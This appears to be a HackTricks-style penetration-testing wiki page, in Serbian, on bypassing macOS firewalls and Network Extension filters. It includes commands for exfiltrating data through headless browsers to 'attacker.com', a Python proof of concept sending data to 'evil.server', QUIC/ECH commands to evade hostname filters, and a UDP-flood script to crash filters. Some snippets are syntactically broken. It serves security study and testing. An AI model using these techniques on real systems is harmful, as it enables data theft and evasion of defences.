# macOS Zaobilaženje vatrozida

{{#include ../../banners/hacktricks-training.md}}

## Pronađene tehnike

Sledeće tehnike su funkcionisale u nekim macOS aplikacijama za vatrozid.

### Abusing whitelist names

- Na primer, pokretanje malware-a koristeći imena dobro poznatih macOS procesa kao što je **`launchd`**

### Synthetic Click

- Ako vatrozid traži dozvolu od korisnika, naterajte malware da **klikne na Allow**

### **Use Apple signed binaries**

- Kao što je **`curl`**, ali i drugi poput **`whois`**

### Well known apple domains

Vatrozid može dozvoljavati konekcije ka dobro poznatim apple domenima kao što su **`apple.com`** ili **`icloud.com`**. I iCloud se može koristiti kao C2.

### Generic Bypass

Neke ideje koje možete probati da zaobiđete vatrozide

### Check allowed traffic

Poznavanje dozvoljenog saobraćaja pomoći će vam da identifikujete potencijalne domene na beloj listi ili koje aplikacije imaju dozvolu za pristup njima
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Zloupotreba DNS-a

DNS rezolucije se obavljaju putem **`mdnsreponder`** potpisane aplikacije koja će verovatno biti dozvoljena da kontaktira DNS servere.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Putem browser aplikacija

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Putem processes injections

Ako možete **inject code into a process** koji ima dozvolu da se poveže na bilo koji server, možete zaobići zaštitu firewalla:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Nedavne macOS firewall bypass ranjivosti (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
U julu 2024. Apple je ispravio kritičnu grešku u Safari/WebKit koja je narušila sistemski “Web content filter” koji koristi Screen Time za roditeljske kontrole.
Specijalno konstruisan URI (npr. sa dvostruko URL-enkodiranim “://”) nije prepoznat od strane Screen Time ACL-a, ali je prihvaćen od strane WebKit-a, pa se zahtev šalje bez filtriranja. Bilo koji process koji može otvoriti URL (uključujući sandboxed ili unsigned code) može tako dostići domene koji su eksplicitno blokirani od strane korisnika ili MDM profila.

Praktičan test (nezakrpljen sistem):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) bug u redosledu pravila u ranoj macOS 14 “Sonoma”
Tokom beta ciklusa macOS 14, Apple je u userspace wrapper oko **`pfctl`** uneo regresiju.
Pravila koja su dodata sa `quick` ključnom rečju (koju koriste mnogi VPN kill-switches) su tiho ignorisana, što je uzrokovalo traffic leaks čak i kada je VPN/firewall GUI prijavljivao *blocked*. Greška je potvrđena od strane nekoliko VPN provajdera i ispravljena u RC 2 (build 23A344).

Brza leak-provera:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
Pre macOS 11.2, **`ContentFilterExclusionList`** je dozvoljavao ~50 Apple binarnih fajlova, kao što su **`nsurlsessiond`** i App Store, da zaobiđu sve socket-filter firewalle implementirane pomoću Network Extension frameworka (LuLu, Little Snitch, itd.).
Malware je mogao jednostavno da pokrene izuzeti proces — ili da u njega injektuje kod — i da tuneluje svoj saobraćaj preko već dozvoljenog socketa. Apple je potpuno uklonio listu izuzetaka u macOS 11.2, ali tehnika je i dalje relevantna na sistemima koji se ne mogu nadograditi.

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH za zaobilaženje Network Extension filtera domena (macOS 12+)
NEFilter Packet/Data Providers se oslanjaju na TLS ClientHello SNI/ALPN. Sa **HTTP/3 over QUIC (UDP/443)** i **Encrypted Client Hello (ECH)** SNI ostaje enkriptovan, NetExt ne može da parsira tok, i pravila za hostname često fail-open, omogućavajući malware da dođe do blokiranih domena bez diranja DNS-a.

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ako je QUIC/ECH i dalje omogućen, ovo je jednostavan način za izbegavanje hostname-filtera.

### macOS 15 “Sequoia” Network Extension nestabilnost (2024–2025)
Rane 15.0/15.1 verzije ruše filtere trećih strana **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, itd.). Kada se filter restartuje, macOS uklanja njegove flow rules i mnogi proizvodi se ponašaju fail‑open. Preplavljivanje filtera hiljadama kratkih UDP tokova (ili forsiranje QUIC/ECH) može ponavljano izazvati pad i ostaviti prozor za C2/exfil dok GUI i dalje tvrdi da firewall radi.

Brza reprodukcija (sigurna lab mašina):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Saveti za alatke u modernom macOS-u

1. Pregledajte trenutna PF pravila koja GUI firewalls generišu:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Navedite binarne fajlove koji već imaju *outgoing-network* entitlement (korisno za piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programatski registrujte sopstveni Network Extension content filter u Objective-C/Swift.
Minimalni rootless PoC koji preusmerava pakete na lokalni soket dostupan je u Patrick Wardle’s **LuLu** source code.

## Reference

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
